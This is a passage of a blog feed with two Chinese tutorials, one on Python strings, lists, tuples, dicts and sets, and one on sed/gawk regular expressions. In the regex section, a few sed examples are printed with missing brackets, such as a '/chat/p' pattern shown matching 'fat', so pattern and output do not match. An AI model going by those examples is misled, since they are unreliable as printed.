        <content type="html"><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>字符串</li><li>列表</li><li>元组</li><li>字典 <ul><li>dict</li><li>set</li></ul></li></ul><a id="more"></a><p><br></p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>最后看一个有问题的条件判断。很多同学会用<code>input()</code>读取用户的输入，这样可以自己输入，程序运行得更有意思：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">birth = input(&apos;birth: &apos;)</span><br><span class="line">if birth &lt; 2000:</span><br><span class="line">    print(&apos;00前&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;00后&apos;)</span><br></pre></td></tr></table></figure><p>输入<code>1982</code>，结果报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: str() &gt; int()</span><br></pre></td></tr></table></figure><p>这是因为<code>input()</code>返回的数据类型是<code>str</code>，<code>str</code>不能直接和整数比较，必须先把<code>str</code>转换成整数。Python提供了<code>int()</code>函数来完成这件事情：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = input(&apos;birth: &apos;)</span><br><span class="line">birth = int(s)</span><br><span class="line">if birth &lt; 2000:</span><br><span class="line">    print(&apos;00前&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;00后&apos;)</span><br></pre></td></tr></table></figure><p>再次运行，就可以得到正确地结果。但是，如果输入<code>abc</code>呢？又会得到一个错误信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ValueError: invalid literal for int() with base 10: &apos;abc&apos;</span><br></pre></td></tr></table></figure><p>原来<code>int()</code>函数发现一个字符串并不是合法的数字时就会报错，程序就退出了。</p><p>因此需要<a href="">捕捉异常处理</a>。</p><p><br></p><h4 id="Unicode-与-ASCII"><a href="#Unicode-与-ASCII" class="headerlink" title="Unicode 与 ASCII"></a>Unicode 与 ASCII</h4><p>Python提供了<code>ord()</code>函数获取字符的整数表示，<code>chr()</code>函数把编码转换为对应的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(&apos;A&apos;)</span><br><span class="line">65</span><br><span class="line">&gt;&gt;&gt; ord(&apos;中&apos;)</span><br><span class="line">20013</span><br><span class="line">&gt;&gt;&gt; chr(20013)</span><br><span class="line">&apos;中&apos;</span><br><span class="line">&gt;&gt;&gt; chr(65)</span><br><span class="line">&apos;A&apos;</span><br></pre></td></tr></table></figure><p>由于Python的字符串类型是<code>str</code>，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把<code>str</code>变为以字节为单位的<code>bytes</code>。</p><p>Python对<code>bytes</code>类型的数据用带<code>b</code>前缀的单引号或双引号表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = b&apos;ABC&apos;</span><br></pre></td></tr></table></figure><p>要注意区分<code>&#39;ABC&#39;</code>和<code>b&#39;ABC&#39;</code>，前者是<code>str</code>，后者虽然内容显示得和前者一样，但<code>bytes</code>的每个字符都只占用一个字节。</p><p><br></p><h4 id="转换-byte-lt-gt-str"><a href="#转换-byte-lt-gt-str" class="headerlink" title="转换  byte &lt;-&gt; str"></a>转换  byte &lt;-&gt; str</h4><p>以Unicode表示的<code>str</code>通过<code>encode()</code>方法可以编码为指定的<code>bytes</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;ABC&apos;.encode(&apos;ascii&apos;)</span><br><span class="line">b&apos;ABC&apos;</span><br><span class="line">&gt;&gt;&gt; &apos;中文&apos;.encode(&apos;utf-8&apos;)</span><br><span class="line">b&apos;\xe4\xb8\xad\xe6\x96\x87&apos;</span><br><span class="line">&gt;&gt;&gt; &apos;中文&apos;.encode(&apos;ascii&apos;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">UnicodeEncodeError: &apos;ascii&apos; codec can&apos;t encode characters in position 0-1: ordinal not in range(128)</span><br></pre></td></tr></table></figure><p>纯英文的<code>str</code>可以用<code>ASCII</code>编码为<code>bytes</code>，内容是一样的，含有中文的<code>str</code>可以用<code>UTF-8</code>编码为<code>bytes</code>。含有中文的<code>str</code>无法用<code>ASCII</code>编码，因为中文编码的范围超过了<code>ASCII</code>编码的范围，Python会报错。</p><p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&apos;ABC&apos;.decode(&apos;ascii&apos;)</span><br><span class="line">&apos;ABC&apos;</span><br><span class="line">&gt;&gt;&gt; b&apos;\xe4\xb8\xad\xe6\x96\x87&apos;.decode(&apos;utf-8&apos;)</span><br><span class="line">&apos;中文&apos;</span><br></pre></td></tr></table></figure><p>如果<code>bytes</code>中包含无法解码的字节，<code>decode()</code>方法会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&apos;\xe4\xb8\xad\xff&apos;.decode(&apos;utf-8&apos;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">UnicodeDecodeError: &apos;utf-8&apos; codec can&apos;t decode byte 0xff in position 3: invalid start byte</span><br></pre></td></tr></table></figure><p>如果<code>bytes</code>中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&apos;\xe4\xb8\xad\xff&apos;.decode(&apos;utf-8&apos;, errors=&apos;ignore&apos;)</span><br><span class="line">&apos;中&apos;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>常见的占位符有：</p><table><thead><tr><th>占位符</th><th>替换内容</th></tr></thead><tbody><tr><td>%d</td><td>整数</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x</td><td>十六进制整数</td></tr></tbody></table><ol><li><p>在Python中，采用的格式化方式和C语言是一致的，用<code>%</code>实现，举例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;Hello, %s&apos; % &apos;world&apos;</span><br><span class="line">&apos;Hello, world&apos;</span><br><span class="line">&gt;&gt;&gt; &apos;Hi, %s, you have $%d.&apos; % (&apos;Michael&apos;, 1000000)</span><br><span class="line">&apos;Hi, Michael, you have $1000000.&apos;</span><br></pre></td></tr></table></figure></li><li><p>format()</p><p>另一种格式化字符串的方法是使用字符串的<code>format()</code>方法，它会用传入的参数依次替换字符串内的占位符<code>{0}</code>、<code>{1}</code>……，不过这种方式写起来比%要麻烦得多：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&apos;.format(&apos;小明&apos;, 17.125)</span><br><span class="line">&apos;Hello, 小明, 成绩提升了 17.1%&apos;</span><br></pre></td></tr></table></figure><p>​</p></li></ol><p><br></p><h3 id="list-列表"><a href="#list-列表" class="headerlink" title="list 列表  []"></a>list 列表  []</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates = [&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><p>list是一个可变的有序表，所以，可以往list中追加元素到末尾：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates.append(&apos;Adam&apos;)</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;, &apos;Adam&apos;]</span><br></pre></td></tr></table></figure><p>也可以把元素插入到指定的位置，比如索引号为<code>1</code>的位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates.insert(1, &apos;Jack&apos;)</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Jack&apos;, &apos;Bob&apos;, &apos;Tracy&apos;, &apos;Adam&apos;]</span><br></pre></td></tr></table></figure><p>要删除list末尾的元素，用<code>pop()</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates.pop()</span><br><span class="line">&apos;Adam&apos;</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Jack&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><p>要删除指定位置的元素，用<code>pop(i)</code>方法，其中<code>i</code>是索引位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates.pop(1)</span><br><span class="line">&apos;Jack&apos;</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><p>要把某个元素替换成别的元素，可以直接赋值给对应的索引位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates[1] = &apos;Sarah&apos;</span><br><span class="line">&gt;&gt;&gt; classmates</span><br><span class="line">[&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;]</span><br></pre></td></tr></table></figure><p>list里面的元素的数据类型也可以不同，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L = [&apos;Apple&apos;, 123, True]</span><br></pre></td></tr></table></figure><p>list元素也可以是另一个list，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [&apos;python&apos;, &apos;java&apos;, [&apos;asp&apos;, &apos;php&apos;], &apos;scheme&apos;]</span><br><span class="line">&gt;&gt;&gt; len(s)</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>要注意<code>s</code>只有4个元素，其中<code>s[2]</code>又是一个list，如果拆开写就更容易理解了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p = [&apos;asp&apos;, &apos;php&apos;]</span><br><span class="line">&gt;&gt;&gt; s = [&apos;python&apos;, &apos;java&apos;, p, &apos;scheme&apos;]</span><br></pre></td></tr></table></figure><p>要拿到<code>&#39;php&#39;</code>可以写<code>p[1]</code>或者<code>s[2][1]</code>，因此<code>s</code>可以看成是一个二维数组，类似的还有三维、四维……数组，不过很少用到。</p><p>如果一个list中一个元素也没有，就是一个空的list，它的长度为0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; L = []</span><br><span class="line">&gt;&gt;&gt; len(L)</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><br></p><h3 id="tuple-元组"><a href="#tuple-元组" class="headerlink" title="tuple 元组  ()"></a>tuple 元组  ()</h3><p>另一种有序列表叫元组：tuple。tuple和list非常类似，但是tuple一旦初始化就不能修改，比如同样是列出同学的名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; classmates = (&apos;Michael&apos;, &apos;Bob&apos;, &apos;Tracy&apos;)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="dict-字典"><a href="#dict-字典" class="headerlink" title="dict 字典 {}"></a>dict 字典 {}</h3><p>Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85&#125;</span><br><span class="line">&gt;&gt;&gt; d[&apos;Michael&apos;]</span><br><span class="line">95</span><br></pre></td></tr></table></figure><p>为什么dict查找速度这么快？因为dict的实现原理和查字典是一样的。假设字典包含了1万个汉字，我们要查某一个字，一个办法是把字典从第一页往后翻，直到找到我们想要的字为止，这种方法就是在list中查找元素的方法，list越大，查找越慢。</p><p>第二种方法是先在字典的索引表里（比如部首表）查这个字对应的页码，然后直接翻到该页，找到这个字。无论找哪个字，这种查找速度都非常快，不会随着字典大小的增加而变慢。 这就是 dict采用的方式。</p><p>把数据放入dict的方法，除了初始化时指定外，还可以通过key放入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&apos;Adam&apos;] = 67</span><br><span class="line">&gt;&gt;&gt; d[&apos;Adam&apos;]</span><br><span class="line">67</span><br></pre></td></tr></table></figure><p>由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&apos;Jack&apos;] = 90</span><br><span class="line">&gt;&gt;&gt; d[&apos;Jack&apos;]</span><br><span class="line">90</span><br><span class="line">&gt;&gt;&gt; d[&apos;Jack&apos;] = 88</span><br><span class="line">&gt;&gt;&gt; d[&apos;Jack&apos;]</span><br><span class="line">88</span><br></pre></td></tr></table></figure><p>如果key不存在，dict就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&apos;Thomas&apos;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &apos;Thomas&apos;</span><br></pre></td></tr></table></figure><p>要避免key不存在的错误，有两种办法，一是通过<code>in</code>判断key是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;Thomas&apos; in d</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>二是通过dict提供的<code>get()</code>方法，如果key不存在，可以返回<code>None</code>，或者自己指定的value：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.get(&apos;Thomas&apos;)</span><br><span class="line">&gt;&gt;&gt; d.get(&apos;Thomas&apos;, -1)</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><p>注意：返回<code>None</code>的时候Python的交互环境不显示结果。</p><p>要删除一个key，用<code>pop(key)</code>方法，对应的value也会从dict中删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.pop(&apos;Bob&apos;)</span><br><span class="line">75</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&apos;Michael&apos;: 95, &apos;Tracy&apos;: 85&#125;</span><br></pre></td></tr></table></figure><p>请务必注意，dict内部存放的顺序和key放入的顺序是没有关系的</p><p><br></p><h4 id="dict-与-list-区别"><a href="#dict-与-list-区别" class="headerlink" title="dict 与 list 区别:"></a>dict 与 list 区别:</h4><p>和list比较，dict有以下几个特点：</p><ol><li>查找和插入的速度极快，不会随着key的增加而变慢；</li><li>需要占用大量的内存，内存浪费多。</li></ol><p>而list相反：</p><ol><li>查找和插入的时间随着元素的增加而增加；</li><li>占用空间小，浪费内存很少。</li></ol><p>所以，dict是用空间来换取时间的一种方法。</p><p><br></p><h3 id="set-字典"><a href="#set-字典" class="headerlink" title="set 字典"></a>set 字典</h3><p>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。</p><p>要创建一个set，需要提供一个list作为输入集合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = set([1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><p>注意，传入的参数<code>[1, 2, 3]</code>是一个list，而显示的<code>{1, 2, 3}</code>只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。。</p><p>重复元素在set中自动被过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = set([1, 1, 2, 2, 3, 3])</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><p>通过<code>add(key)</code>方法可以添加元素到set中，可以重复添加，但不会有效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.add(4)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br><span class="line">&gt;&gt;&gt; s.add(4)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><p>通过<code>remove(key)</code>方法可以删除元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s.remove(4)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure><p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s1 = set([1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; s2 = set([2, 3, 4])</span><br><span class="line">&gt;&gt;&gt; s1 &amp; s2</span><br><span class="line">&#123;2, 3&#125;</span><br><span class="line">&gt;&gt;&gt; s1 | s2</span><br><span class="line">&#123;1, 2, 3, 4&#125;</span><br></pre></td></tr></table></figure><p>set和dict的唯一区别仅在于没有存储对应的value，但是，set的原理和dict一样，所以，同样不可以放入可变对象，因为无法判断两个可变对象是否相等，也就无法保证set内部“不会有重复元素”。试试把list放入set，看看是否会报错。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>正则表达式</title>
      <link href="/2018/01/01/gram/shell-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2018/01/01/gram/shell-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式是你所定义的模式模板,  Linux工具(sed 和 gawk ) 能够在处理数据时使用正则表达式对数据进行模式匹配， 匹配成功, 接受下一步处理  否则 被过滤掉。</p><a id="more"></a><p><br></p><h4 id="正则表达式类型"><a href="#正则表达式类型" class="headerlink" title="正则表达式类型:"></a>正则表达式类型:</h4><p>使用正则表达式最大的问题在于不止一种类型的正则表达式, 不同的应用程序可能会用不同类型的正则表达式.</p><p>正则表达式是通过正则表达式引擎实现的[ 一套底层软件, 负责解释正则表达式模式并使用这些模式进行文本匹配 ]</p><p>Linux 两种流行正则表达式引擎:</p><ul><li>POSIX 基础正则表达式引擎(basic regular expression, BRE)</li><li>POSIX 扩展正则表达式引擎(extended regular expression,  ERE)</li></ul><p>大多数Linux工具都至少符合POSIX BRE引擎规范, 能够识别该规范定义的所有模式符号.</p><p>sed 编辑器基本符合BRE引擎</p><p>gawk编辑器符合ERE引擎</p><p><br></p><h4 id="定义BRE模式"><a href="#定义BRE模式" class="headerlink" title="定义BRE模式"></a>定义BRE模式</h4><p>脱字符(^) : 定义从数据流中文本行的行首开始的模式</p><p>美元符($) : 定义行尾锚点</p><p>点号字符(.):   用来匹配换行符之外的任意单个字符</p><p><br></p><h5 id="字符组-用来匹配文本模式中某个位置的一组字符"><a href="#字符组-用来匹配文本模式中某个位置的一组字符" class="headerlink" title="字符组:  用来匹配文本模式中某个位置的一组字符"></a>字符组:  用来匹配文本模式中某个位置的一组字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &apos;/[ch]at/p&apos;  filename    ## 匹配cat or hat</span><br></pre></td></tr></table></figure><p><br></p><h5 id="排除型字符组"><a href="#排除型字符组" class="headerlink" title="排除型字符组"></a>排除型字符组</h5><p>用来排除字符组中的字符,  用来寻找字符组中不存在字符:  [^]  表示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$cat name.sh </span><br><span class="line">hat</span><br><span class="line">fat</span><br><span class="line">cat</span><br><span class="line"></span><br><span class="line">$sed -n &apos;/chat/p&apos;  filename</span><br><span class="line">fat</span><br></pre></td></tr></table></figure><p><br></p><h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><h5 id="区间-用单破折号在字符组中表示字符区间"><a href="#区间-用单破折号在字符组中表示字符区间" class="headerlink" title="区间: 用单破折号在字符组中表示字符区间."></a>区间: 用单破折号在字符组中表示字符区间.</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$cat number</span><br><span class="line">12354</span><br><span class="line">asdff</span><br><span class="line">53453</span><br><span class="line">65</span><br><span class="line">335</span><br><span class="line"></span><br><span class="line">$sed -n &apos;/0-90-9[0-9]/p&apos; number</span><br><span class="line">12354</span><br><span class="line">53453</span><br><span class="line"></span><br><span class="line">sed -n &apos;/^[0-9][0-9][0-9][0-9][0-9]/p&apos; number   ##行首 到 行尾</span><br><span class="line">12354</span><br><span class="line">53453</span><br></pre></td></tr></table></figure><p><strong>多个不连续区间</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ echo 1  | sed -n &apos;/[0-26-9]/p&apos;</span><br><span class="line">1</span><br><span class="line">$ echo 5  | sed -n &apos;/[0-26-9]/p&apos;</span><br><span class="line">$ echo 1  | sed -n &apos;/[0-26-9]/p&apos;</span><br><span class="line">1</span><br><span class="line">$ echo 5  | sed -n &apos;/[0-26-9]/p&apos;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="特殊字符组"><a href="#特殊字符组" class="headerlink" title="特殊字符组"></a>特殊字符组</h5><table><thead><tr><th>字符组</th><th>描述</th></tr></thead><tbody><tr><td>[[:alpha:]]</td><td>匹配任意字母字符,不管大写还是小写</td></tr><tr><td>[[:alnum:]]</td><td>匹配任意字母数字字符0-9, A-Z a-z</td></tr><tr><td>[[:digit:]]</td><td>匹配0-9之间的数字 [0-9]</td></tr><tr><td>[[:lower:]]</td><td>匹配小写字母字符 a-z</td></tr><tr><td>[[:upper:]]</td><td>匹配任意大写字母字符 A-Z</td></tr><tr><td>[[:blank:]]</td><td>匹配空格或制表符</td></tr><tr><td>[[:punct:]]</td><td>匹配任意点符号</td></tr><tr><td>[[:space:]]</td><td>匹配任意空白字符: 空格, 制表符, NL, FF, VT, CR</td></tr><tr><td>[[:print:]]</td><td>匹配任意可打印字符</td></tr></tbody></table><p><br></p><h5 id="星号-放置于字符后面-表明该字符必须在匹配模式出现0次或者多次"><a href="#星号-放置于字符后面-表明该字符必须在匹配模式出现0次或者多次" class="headerlink" title="星号:  放置于字符后面,表明该字符必须在匹配模式出现0次或者多次"></a>星号:  放置于字符后面,表明该字符必须在匹配模式出现0次或者多次</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -n &apos;/^she*t/p&apos; string</span><br><span class="line">sheet</span><br><span class="line">sed -n &apos;/^sh[ea]*t/p&apos; string</span><br><span class="line">sheet</span><br><span class="line">shaat</span><br></pre></td></tr></table></figure><p><br></p><h4 id="定义ERE模式"><a href="#定义ERE模式" class="headerlink" title="定义ERE模式"></a>定义ERE模式</h4><ul><li>星号 (*): 表明前面的字符出现0次或者多次</li><li>问号 (?) : 表明前面的字符只出现0次或者1次</li><li>加号 (+): 表明前面的字符至少出现1次</li><li>花括号{}:  允许我可重复的正则表达式指定一个上限. 称为间隔<ul><li>m :   正则表达式准确出现 m 次</li><li>m, n :  正则表达式至少出现m次, 最多n次</li><li>默认情况下:  gawk不会识别ERE的间隔, 需要指定 <code>--re-interval</code></li></ul></li></ul><ul><li><p>管道符号</p><ul><li>管道符号允许你在检查数据流时,用逻辑OR方式指定正则表达式引擎要用两个或多个模式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$cat name.sh</span><br><span class="line">hello,world</span><br><span class="line">hat</span><br><span class="line">fat</span><br><span class="line">cat</span><br><span class="line"></span><br><span class="line">$ gawk &apos;/cat|fat/&#123;print $0&#125;&apos; name.sh </span><br><span class="line">fat</span><br><span 